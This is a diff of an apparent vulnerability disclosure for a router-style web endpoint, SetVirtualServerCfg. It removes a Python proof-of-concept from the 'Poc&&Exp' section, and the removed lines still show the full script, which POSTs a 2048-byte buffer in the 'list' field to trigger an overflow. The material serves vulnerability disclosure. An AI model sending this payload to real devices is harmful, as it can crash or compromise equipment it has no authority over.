@@ -29,36 +29,7 @@ Then the program uses the dangerous function sscanf to format v5 and pass it int
 
 ## Poc&&Exp
 
-```
-import argparse
-import requests
-requests.packages.urllib3.disable_warnings()
-
-parser = argparse.ArgumentParser()
-parser.add_argument("-u", "--url")
-args = parser.parse_args()
-host = args.url
-cyclic = b"a"*2048    
-
-def exploit(host):
-    url = f"http://{host}/goform/SetVirtualServerCfg"
-    data = {
-        b'list':cyclic
-    }
-    res = requests.post(url=url,data=data)
-    
-
-if __name__ == "__main__":
-    if args.url:
-        try:
-            exploit(args.url)
-            print("[+] Exploit finished!")
-        except Exception as e:
-            print("[-]", e)
-            print("[-] Exploit finished!")
-    else:
-        print("[*] Use -h get help info.")
-```
+The content of this part is placed in the additional information
 
 
 
